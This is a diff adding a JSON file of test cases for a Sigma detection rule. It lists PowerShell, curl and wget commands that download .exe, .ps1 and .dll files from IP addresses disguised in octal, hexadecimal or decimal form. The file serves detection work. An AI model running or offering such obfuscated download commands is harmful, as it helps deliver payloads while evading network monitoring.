@@ -1,0 +1,22 @@
+[
+  {
+    "output": "iwr 'http://0121.04.0174.012/test.exe' -OutFile test.exe",
+    "explanation": "This command uses an obfuscated octal IP address in the URL. The Sigma rule should detect this as a match because it contains an encoded IP address format."
+  },
+  {
+    "output": "curl -o test.exe 'http://81.4.31754/download.exe'",
+    "explanation": "This command uses an obfuscated decimal IP address in the URL. The Sigma rule should detect this as a match because it contains an encoded IP address format."
+  },
+  {
+    "output": "irm 'http://0x51.0x4.0x1f.0x1e/file.ps1'",
+    "explanation": "This command uses an obfuscated hexadecimal IP address in the URL. The Sigma rule should detect this as a match because it contains an encoded IP address format."
+  },
+  {
+    "output": "wget 'http://1359248394/resource.dll' -O resource.dll",
+    "explanation": "This command uses a single obfuscated decimal IP address in the URL. The Sigma rule should detect this as a match because it contains an encoded IP address format."
+  },
+  {
+    "output": "Invoke-WebRequest -Uri 'http://0x51.0x4.0x1f.0x1e/data.txt' -OutFile data.txt",
+    "explanation": "This command uses an obfuscated hexadecimal IP address in the URL. The Sigma rule should detect this as a match because it contains an encoded IP address format."
+  }
+]
